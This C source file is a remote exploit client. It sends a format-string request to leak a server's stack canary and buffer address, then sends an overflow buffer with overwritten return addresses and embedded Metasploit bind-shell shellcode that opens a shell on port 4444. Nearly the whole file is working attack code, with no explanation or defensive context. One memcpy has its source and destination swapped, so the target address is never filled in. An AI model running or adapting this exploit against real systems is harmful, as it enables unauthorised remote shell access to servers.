#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/*
 * linux/x86/shell_bind_tcp - 78 bytes
 * http://www.metasploit.com
 * LPORT=4444, RHOST=, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependChrootBreak=false, AppendExit=false, 
 * InitialAutoRunScript=, AutoRunScript=
 */
const char payload[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";

static char jmp_buffer[] = "AAAAAAAAAAAAAAAACCCCBBBBCCCCDDDDBBBBCCCC"
	"DDDDEEEEFFFFGGGG";

void error(char *msg)
{
    perror(msg);
    exit(0);
}

int main(int argc, const char *argv[])
{
	char buffer[256];
	unsigned long canary, bufaddr;
	int sockfd, portno, n, r;
	struct sockaddr_in serv_addr;
	struct hostent *server;

	if (argc < 3) {
		fprintf(stderr,"usage %s hostname port\n", argv[0]);
		exit(1);
	}

	server = gethostbyname(argv[1]);
	if (server == NULL) 
		fprintf(stderr,"ERROR, no such host\n");
	portno = atoi(argv[2]);
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) 
		error("ERROR opening socket");

	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	memcpy(server->h_addr, &serv_addr.sin_addr.s_addr, server->h_length);
	serv_addr.sin_port = htons(portno);

	r = connect(sockfd, (struct sockaddr *)&serv_addr,sizeof(serv_addr));
	if (r != 0)
		error("ERROR connecting");

	// Learn canary
	strcpy(buffer, "%7$08x %15$08x\n");
	printf("Sending format string\n");
	n = write(sockfd, buffer, strlen(buffer));
	if (n != strlen(buffer))
		error("ERROR writing format string");
	
	n = read(sockfd, buffer, 17);
	buffer[8] = '\0';
	buffer[17] = '\0';

	bufaddr = strtoul(buffer, NULL, 16);
	printf("Learned buffer address: \"%s\" %08lx\n", buffer, bufaddr);

	canary = strtoul(buffer + 9, NULL, 16);
	printf("Learned canary: \"%s\" %08lx\n", buffer + 9, canary);

	memcpy(jmp_buffer + 16, &canary, sizeof(canary));
	bufaddr += sizeof(jmp_buffer);
	// Copy return address 3 times
	memcpy(jmp_buffer + 32, &bufaddr, sizeof(bufaddr));
	memcpy(jmp_buffer + 40, &bufaddr, sizeof(bufaddr));
	memcpy(jmp_buffer + 48, &bufaddr, sizeof(bufaddr));

	write(sockfd, jmp_buffer, sizeof(jmp_buffer));
	write(sockfd, payload, sizeof(payload));
	write(sockfd, "\n", 1);

	pause();

	return 0;
}
